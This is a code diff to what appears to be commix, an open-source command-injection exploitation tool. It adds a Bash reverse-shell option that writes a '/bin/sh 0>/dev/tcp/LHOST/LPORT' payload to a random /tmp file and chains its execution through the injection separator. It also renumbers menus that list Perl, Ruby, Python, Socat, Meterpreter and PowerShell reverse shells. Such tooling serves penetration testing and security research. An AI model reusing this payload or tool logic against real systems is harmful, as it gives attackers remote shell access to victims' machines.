@@ -19,6 +19,8 @@ import sys
 import time
 import urllib
 import base64
+import random
+import string
 import subprocess
 from src.utils import menu
 from src.utils import update
@@ -33,7 +35,7 @@ def shell_options(option):
     warn_msg = "You are already into the '" + option.lower() + "' mode."
     print settings.print_warning_msg(warn_msg)
   elif option.lower() == "?": 
-    menu.reverse_tcp_options()
+    menu.reverse_tcp_options(separator)
   elif option.lower() == "quit": 
     sys.exit(0)
   elif option[0:3].lower() == "set":
@@ -195,7 +197,7 @@ def check_uripath(uripath):
 """
 Set up the netcat reverse TCP connection
 """
-def netcat_version():
+def netcat_version(separator):
   
   # Defined shell
   shell = "sh"
@@ -280,7 +282,7 @@ Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbs
 Set up other [1] reverse tcp shell connections
 [1] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 """
-def other_reverse_shells():
+def other_reverse_shells(separator):
 
   while True:
     other_shell = raw_input("""
@@ -290,11 +292,12 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl revers
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby reverse TCP shell. 
 Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
 Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat reverse TCP shell.
+Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Bash reverse TCP shell.
 \n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter reverse TCP shells""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
-Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
-Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
-Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use the web delivery script. 
+Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
+Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
+Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
+Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use the web delivery script. 
 \ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
     
     # PHP-reverse-shell
@@ -343,9 +346,15 @@ Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use the web deliv
                     " exec:\"sh\",pty,stderr,setsid,sigint,sane"
       break
 
-    # PHP-reverse-shell (meterpreter)
+    # Bash-reverse-shell 
     elif other_shell == '6':
+      tmp_file = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(5)])
+      other_shell = "echo \"/bin/sh 0>/dev/tcp/"+ settings.LHOST + "/" + settings.LPORT + \
+                    " 1>%260 2>%260\" > /tmp/" + tmp_file + " " + separator + " /bin/bash /tmp/" + tmp_file
+      break
 
+    # PHP-reverse-shell (meterpreter)
+    elif other_shell == '7':
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
         print settings.print_error_msg(error_msg)
@@ -388,7 +397,7 @@ Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use the web deliv
       break
 
     # Python-reverse-shell (meterpreter)
-    elif other_shell == '7':
+    elif other_shell == '8':
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
@@ -433,7 +442,7 @@ Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use the web deliv
       break
     
     # Powershell injection attacks
-    elif other_shell == '8':
+    elif other_shell == '9':
       if not settings.TARGET_OS == "win":
         windows_only_attack_vector()
         continue
@@ -555,7 +564,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
       break
     
     # Web delivery script
-    elif other_shell == '9':
+    elif other_shell == '10':
       while True:
         web_delivery = raw_input("""
 ---[ """ + Style.BRIGHT + Fore.BLUE + """Web delivery script""" + Style.RESET_ALL + """ ]---
@@ -637,7 +646,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
 """
 Choose type of reverse TCP connection.
 """
-def reverse_tcp_options():
+def reverse_tcp_options(separator):
 
   while True:
     reverse_tcp_option = raw_input("""   
@@ -653,7 +662,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TC
 
     # Option 1 - Netcat shell
     elif reverse_tcp_option == '1' :
-      reverse_tcp_option = netcat_version()
+      reverse_tcp_option = netcat_version(separator)
       if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
         shell_success()
         break
@@ -663,7 +672,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TC
         pass  
     # Option 2 - Other (Netcat-Without-Netcat) shells
     elif reverse_tcp_option == '2' :
-      reverse_tcp_option = other_reverse_shells()
+      reverse_tcp_option = other_reverse_shells(separator)
       if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
         shell_success()
         break
@@ -682,7 +691,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TC
 """
 Set up the reverse TCP connection
 """
-def configure_reverse_tcp():
+def configure_reverse_tcp(separator):
   # Set up LHOST for the reverse TCP connection
   while True:
     option = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
@@ -691,7 +700,7 @@ def configure_reverse_tcp():
       print settings.print_warning_msg(warn_msg)
       continue
     if option.lower() == "?": 
-      menu.reverse_tcp_options()
+      menu.reverse_tcp_options(separator)
       continue
     if option.lower() == "quit": 
       sys.exit(0)
